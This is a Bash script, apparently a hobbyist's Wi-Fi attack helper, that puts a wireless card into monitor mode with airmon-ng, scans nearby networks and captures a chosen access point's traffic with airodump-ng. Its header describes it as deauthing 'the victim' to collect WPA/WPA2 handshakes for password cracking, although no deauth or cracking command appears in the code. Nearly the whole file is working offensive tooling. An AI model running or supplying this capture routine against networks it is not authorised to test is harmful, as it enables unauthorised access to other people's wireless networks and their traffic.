#! /bin/bash 

echo "----------------------------------------------------------------------------"
echo "           Welcome To WPA/WPA2 or WEP Password Cracking  Interface          "
echo "----------------------------------------------------------------------------"

#############################################################################################
<<comm
This script Deauth the victim and capture WPA/WPA2 handshake for password cracking. 

OS : Linux Debian based
Auther : Nimesh

comm
#############################################################################################

# Function to capture handshake.
target_ap()
{
    read -p "Enter BSSID of Target-AP : " bssid_ap
    echo "Target AP ---> " $bssid_ap

    # capture and save packets for Target AP
    directory_name="captured_packets"
    read -p "Enter file name for packet storage : " file_name

    # Check if the directory exists
    if [ -d "$directory_name" ]; 
    then
        echo "Directory '$directory_name' already exists."
    else
        # Create the directory
        mkdir "$directory_name"
        echo "Directory created - '$directory_name'."
    fi

    sleep 1
    airodump-ng -c 1 --bssid $bssid_ap -w $directory_name/$file_name $card_mon

}


# Check if the script is running as root
if [ "$EUID" -ne 0 ]; 
then
    echo -e "[ERROR]: This script must be run as root. Please use sudo or run as root."
    exit 1
fi

# Check for avilable wireless interfaces 

list=`airmon-ng | grep "wl" | awk '{print $2}'`
if [[ -z "$list" ]];     # To find out if a bash variable is empty (-z retn. 0 if true)
then
    echo "[ERROR]: No Wireless Adapter detected.... "

else
    ntw_inter=($list)
    echo "Available Wireless Interfaces are : "
    for ((i=0; i<${#ntw_inter[@]}; i++));
    do 
        echo "$i - ${ntw_inter[i]}"
    done

    read -p "Please select number of interface : " index 
    wifi_card=${ntw_inter[index]}

    ##############################################################################################
    echo "Turning $wifi_card into monitoring mode........"
    sleep 2
    airmon-ng start $wifi_card 
    sleep 3
    
    # Scanning for Wireless networks in monitoring mode or not
    list2=`iwconfig | grep "Mode:Monitor" | awk '{print $1}'`
    card_mon=($list2)
    echo "Press CTRL+C to Stop scanning.. "
    trap 'target_ap' SIGINT

    if [[ -z "$card_mon" ]];     # To find out if a bash variable is empty (-z retn. 0 if true)
    then 
        echo "[ERROR]: Your Wifi Interface doesn't Support Monitoring Mode "
    
    elif [[ ${#card_mon[@]} -gt 1 ]];
    then 
        for ((i=0; i<${#card_mon[@]}; i++));
        do 
            echo "$i - ${card_mon[i]}"
        done
        read -p "selected any one mode : " sr
        # trap 'target_ap' SIGINT      # For KEYBOARD Interrupt.. 
        airodump-ng ${card_mon[sr]}

    else
        # trap 'target_ap' SIGINT      # For KEYBOARD Interrupt.. 
        airodump-ng $card_mon

    fi 

fi 


